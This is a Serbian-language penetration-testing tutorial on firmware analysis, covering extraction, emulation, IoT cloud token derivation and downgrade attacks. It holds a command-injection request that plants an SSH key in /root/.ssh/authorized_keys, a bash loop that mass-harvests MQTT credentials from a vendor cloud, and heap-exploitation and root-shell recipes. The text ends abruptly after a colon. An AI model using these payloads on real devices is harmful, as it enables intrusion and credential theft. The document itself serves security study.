# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključan softver koji omogućava uređajima da ispravno rade, upravljajući komunikacijom između hardverskih komponenti i softvera s kojim korisnici stupaju u interakciju. Čuva se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što pokreće operativni sistem. Analiza firmvera i njegove potencijalne izmene ključni su koraci u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je važan prvi korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces podrazumeva prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji pokreće
- Specifičnostima bootloader-a
- Rasporedu hardvera i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza dostupnih komponenti open-source softvera, ručnim i automatizovanim pregledom. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmvera**

Firmver se može nabaviti na više načina, od kojih svaki ima različit nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izradom** prema dostavljenim uputstvima
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **cloud storage**-u, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću tehnika man-in-the-middle
- **Izdvajanjem** iz uređaja putem veza kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Otkrivanjem i korišćenjem **hardcoded krajnjih tačaka za ažuriranje**
- **Preuzimanjem dump-a** iz bootloader-a ili preko mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa, kada ništa drugo ne pomogne, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: prinudno pokretanje root shell-a putem U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prinudno pokrenuti init shell tako što ćete **izmeniti U-Boot environment blob** van mreže:<sup>[[6]](#references)</sup>

1. Napravite dump SPI flash-a pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; trebalo bi da se pojavi shell na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem pristupa eksternoj flash memoriji.

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da izdvojite informacije o njemu kako biste znali kako da postupite. Za to možete da koristite različite alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`; ako je entropija niska, slika verovatno nije šifrovana. Ako je entropija visoka, verovatno je šifrovana (ili komprimovana na neki način).

Pored toga, možete koristiti ove alate da izdvojite **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili koristite [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da biste pregledali datoteku.

### Dobavljanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da uspete da **izdvojite fajl sistem**.\
Binwalk ga obično izdvaja u **direktorijum nazvan po tipu fajl sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk **nema magične bajtove fajl sistema u svojim potpisima**. U tim slučajevima, upotrebite binwalk da biste **pronašli pomeraj fajl sistema i izdvojili komprimovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojili** u skladu s tipom fajl sistema, koristeći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs fajl-sistema.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u primeru iznad)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmvera

Kada se firmver pribavi, neophodno ga je detaljno analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje vrednih podataka iz slike firmvera.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemima datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenilo da li je image šifrovan, proverava se **entropija** pomoću komande `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija ukazuje na moguće šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih fajlova** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled fajlova.

### Izdvajanje fajl sistema

Pomoću komande `binwalk -ev <bin>` obično se može izdvojiti fajl sistem, najčešće u direktorijum nazvan prema tipu fajl sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne prepozna tip fajl sistema zbog nedostajućih magic bytes, potrebno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje pomeraja fajl sistema, a zatim komande `dd` za izdvajanje fajl sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa sistema datoteka (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza sistema datoteka

Kada se sistem datoteka izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje nebezbednim mrežnim daemonima, hardkodovanim akreditivima, API endpointima, funkcijama servera za ažuriranje, nekompajliranom kodu, startup skriptama i kompajliranim binarnim datotekama za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za akreditive korisnika
- SSL sertifikate i ključeve u direktorijumu **etc/ssl**
- Konfiguracione i skriptne datoteke zbog potencijalnih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u sistemu datoteka:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u sistemu datoteka moraju se pažljivo pregledati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u otkrivanju nezaštićenih binarnih datoteka koje bi mogle biti iskorišćene.

## Prikupljanje cloud konfiguracije i MQTT akreditiva pomoću tokena izvedenih iz URL-a

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpointa koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao velika heksadecimalna slova

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, čime se često otkrivaju MQTT akreditivi u otvorenom tekstu i prefiksi tema.

Praktičan postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite UART adapter od 3.3 V (TX/RX/GND) i zabeležite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a konfiguracije u oblaku i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmvera

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite hash u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl; parsirajte ga pomoću jq da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba nešifrovanog MQTT-a i slabih ACL-ova za topic-e (ako postoje)

- Koristite pribavljene akreditive da biste se pretplatili na topic-e za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa dobavljača, iza kojih sledi sekvencijalni sufiks.
- Možete iterirati kroz kandidate za ID-jeve, izvoditi tokene i programski preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovnog enumerisanja.
- Kada je moguće, dajte prednost emulaciji ili statičkoj analizi za otkrivanje tajni, bez izmene ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na probleme zbog zavisnosti od hardvera ili arhitekture, ali prenos root filesystem-a ili određenih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i redosledom bajtova, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Za analizu pojedinačnih programa ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu možete koristiti komandu:

```bash
file ./squashfs-root/bin/busybox
```

A za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, dok je za binarne datoteke little-endian odgovarajući izbor `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, a za emulaciju se koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i olakšavajući dinamičku analizu.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi okruženje stvarnog ili emuliranog uređaja. Neophodno je zadržati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa, kao i istraživanje ranjivosti bootloader-a. Testovi integriteta firmware-a ključni su za prepoznavanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju. Za postavljanje breakpoint-a i otkrivanje ranjivosti pomoću fuzzing-a i drugih tehnika koriste se alati kao što su gdb-multiarch, Frida i Ghidra.

Za embedded uređaje bez punog debugger-a, **kopirajte statički linkovan `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima, RF stek je često podeljen između **radio MCU-a** i Linux procesa u userspace-u. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **Parser na strani kontrolera** na radio MCU-u
3. **Tekstualni ili TLV protokol preko serijske veze/UART-a** koji se prosleđuje Linuxu (na primer `/dev/tty*`)
4. **Dispatcher aplikacije** u glavnom daemonu
5. **Handler specifičan za protokol / mašina stanja**

Ova arhitektura daje dva cilja za reverse engineering umesto jednog. Ako kontroler pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i dispatch tabele
- Koje poruke mogu doći iz **mreže**, a koje od samog kontrolera
- Tačna polja za razlikovanje specifična za proizvođača (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handler-i su dostupni samo tokom faza **commissioning-a**, otkrivanja uređaja ili preuzimanja firmware-a/modela

Za Zigbee konkretno, snimite saobraćaj tokom uparivanja i proverite da li se uređaj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje saobraćaja tokom commissioning-a može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista obavezno zahteva.

### Handler-i za protokole specifične za proizvođača i dostupnost ograničena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera, jer se prosleđuju **prilagođenom kodu za parsiranje** i internim **FSM-ovima** sa slabije proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Reverzno analizirajte dispatcher komandi dok ne pronađete **handler dostupan samo proizvođaču**.
- Pronađite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Utvrdite **prelazna stanja** koja automatski napreduju, kao i retry/error grane koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje legitimne razmene protokola su potrebne da bi se daemon doveo u ranjivo stanje, umesto da pretpostavite da je ranjivi handler uvek dostupan.

Kod protokola osetljivih na kašnjenje, reprodukcija paketa iz Python framework-a može biti prespora. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz stek za uređaje proizvođača, kako bi se izložili ispravni **endpoints**, **attributes** i tajming za commissioning.

### Klasa grešaka pri fragmentiranom preuzimanju u embedded daemonima

Ponavljajuća klasa grešaka u firmware-u javlja se pri **fragmentiranom preuzimanju blob/modela/konfiguracije**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo polja pod kontrolom napadača koja se odnose na pojedinačni paket, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je veličina unutar **prvobitno alociranog prostora**.

Napadač tako može da pošalje:

- Ispravan prvi fragment sa **malom** deklarisanom ukupnom veličinom, čime se primorava mala heap alokacija.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Lažiranu veličinu pojedinačnog paketa koja prolazi sveže provere, ali i dalje dovodi do prekoračenja prvobitno alociranog bafera.

Kada je ranjiva putanja zaštićena commissioning logikom, eksploatacija mora da uključi dovoljno **emulacije uređaja** da se cilj dovede do očekivanog stanja za preuzimanje modela ili blob-a pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U embedded daemonima, najlakši način da se pokrene eksploatacija heap metapodataka često nije „čekanje na čišćenje“, već **pokretanje mehanizma za obradu grešaka u samom protokolu**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM prebacili u **retry** ili **error** stanja.
- Prekoračite prag ponovnih pokušaja kako bi daemon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidivi `free()` da pokrenete primitivne operacije allocator-a pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv allocator-a nalik **musl/uClibc/dlmalloc** u embedded Linuxu, gde oštećivanje chunk metapodataka može pretvoriti unlink/unbin logiku u primitivnu operaciju upisa. Stabilan obrazac je oštećivanje **size polja** kako bi se allocator-ovo pretraživanje preusmerilo na **lažne chunk-ove postavljene unutar bafera koji je prepisan**, umesto da se odmah oštete stvarni bin pokazivači i sruši proces.

## Eksploatacija binarnih fajlova i Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Runtime zaštite binarnih fajlova u embedded sistemima su retke, ali kada postoje, mogu biti potrebne tehnike poput Return Oriented Programming (ROP).

### Napomene o uClibc fastbin eksploataciji (embedded Linux)

- **Fastbins + konsolidacija:** uClibc koristi fastbins slične onima u glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki lažni chunk mora da prođe provere (ispravna veličina, `fd = 0` i okolni chunk-ovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarni fajlovi bez PIE-a pod ASLR-om:** ako je ASLR uključen, ali je glavni binarni fajl **non-PIE**, adrese unutar binarnog fajla u `.data/.bss` su stabilne. Možete ciljati region koji već liči na ispravno zaglavlje heap chunk-a kako bi fastbin alokacija završila na **tabeli pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može da zaustavi parsiranje, a da pritom sačuva naredne bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da postavi izvršivi shellcode u poznato mapiranje i skoči na njega.

## Pripremljeni operativni sistemi za analizu firmware-a

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) nude unapred konfigurisana okruženja za testiranje bezbednosti firmware-a, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i penetration testing-u IoT (Internet of Things) uređaja. Štedi mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje embedded bezbednosti, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmware-a.

## Napadi vraćanjem firmware-a na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa firmware image-a, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne poredi *verziju* (ili monotoni brojač) image-a koji se flešuje, napadač može legitimno da instalira **stariji, ranjivi firmware koji i dalje ima važeći potpis**, čime se ponovo uvode zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Uobičajen postupak napada:

1. **Nabavite stariji potpisani image**
   * Preuzmite ga sa javnog portala za preuzimanje, CDN-a ili sajta za podršku proizvođača.
   * Izdvojite ga iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite ga u repozitorijumima trećih strana kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite image na uređaj ili ga poslužite uređaju** preko bilo kog dostupnog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) endpoint-e koji prihvataju Base64-kodirane firmware blob-ove, dekodiraju ih na serveru i pokreću recovery/nadogradnju.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji ponovo flešujte najnoviji image ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon sticanja persistence-a.

### Primer: Command Injection nakon downgrade-a

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (vraćenom na stariju verziju) firmveru, parametar `md5` se direktno nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa pomoću SSH ključa). Kasnije verzije firmvera uvele su osnovni filter znakova, ali zbog izostanka zaštite od vraćanja na stariju verziju ova ispravka nema efekta.<sup>[[4]](#references)</sup>

### Izdvajanje firmvera iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne slike firmvera u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth/Wi-Fi veze. Ti paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama poput `assets/fw/` ili `res/raw/`. Alatke kao što su `apktool`, `ghidra`, pa čak i običan `unzip`, omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje zaštite od vraćanja na stariju verziju koja postoji samo u updateru kod dizajna sa A/B slotovima

Neki proizvođači implementiraju **ratchet** protiv vraćanja na stariju verziju, ali samo unutar logike *updatera* (na primer, UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slota, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmware-a sadrže i deskriptor verzije i **bezbednosni ratchet** / monotoni brojač.
- Updater upoređuje ratchet slike sa vrednošću sačuvanom u trajnoj memoriji i odbacuje starije potpisane slike.
- **Bootloader** ne parsira taj ratchet, već pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se zasebno, u tabeli particija ili brojaču generacije za svaki slot, i **nije kriptografski vezana** za tačan digest validiranog firmware-a.

To u sistemima sa dva slota omogućava primitivu **validiraj jednu sliku / pokreni drugu sliku**. Ako napadač može da natera updater da označi slot B kao sledeći cilj pokretanja pomoću aktuelne potpisane slike, a zatим da pre ponovnog pokretanja prepiše slot B, bootloader može ipak da pokrene vraćenu stariju sliku jer veruje samo već potvrđenim metapodacima slota.

Uobičajeni obrazac zloupotrebe:

1. Učitajte **aktuelni potpisani** firmware u pasivni slot i pokrenite uobičajenu rutinu za validaciju/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni.
2. **Nemojte još da restartujete uređaj**. U istoj sesiji ponovo pokrenite rutinu za pripremu/brisanje slota.
3. Iskoristite zastarelo stanje pokретања ili zastarelu logiku izbora slota, tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **stariji, ali i dalje potpisani** firmware u taj slot.
5. Preskočite rutinu za validaciju koja sprovodi ratchet i direktno restartujte uređaj.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće staru sliku.

Na šta obratiti pažnju pri reverziranju A/B implementacija ažuriranja:

- Izbor slota izveden iz **zastavica pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja, a ne na osnovu **trenutnog potvrđenog rasporeda**.
- Funkcija u stilu `part_write_layout()` koja samo povećava **brojač generacije** / postavlja zastavicu aktivnog slota i ne čuva hash validirane slike.
- Provere ratchet-а implementirane u userspace-u ili kodu updatera, ali **ne** u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili recovery koje ostavljaju slot označen kao pokretljiv, i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/Autentifikacija *update endpoint*-a dovoljno zaštićena (TLS + autentifikacija)?
* Da li uređaj pre flešovanja upoređuje **brojeve verzija** ili **monotoni brojač za zaštitu od vraćanja na stariju verziju**?
* Da li se slika proverava unutar secure boot lanca (npr. da li ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju validiranog firmware-a**, ili se slot može izmeniti nakon promocije?
* Nakon uspešne promene slota, da li se uređaj obavezno restartuje ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li kod userland-a obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* ili *backup* tokovi ažuriranja ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na napade vraćanjem na stariju verziju.

## Ranjivi firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće ranjive projekte kao polaznu tačku.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekat Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmware-a iz ugrađenog stanja KMS/Vault-a

Kada slika ažuriranja kombinuje male metapodatke u otvorenom tekstu sa velikim blobom visoke entropije, prvo analizirajte kontejner pre nego što pokušate bilo šta da razbijete grubom silom:<sup>[[1]](#references)</sup>

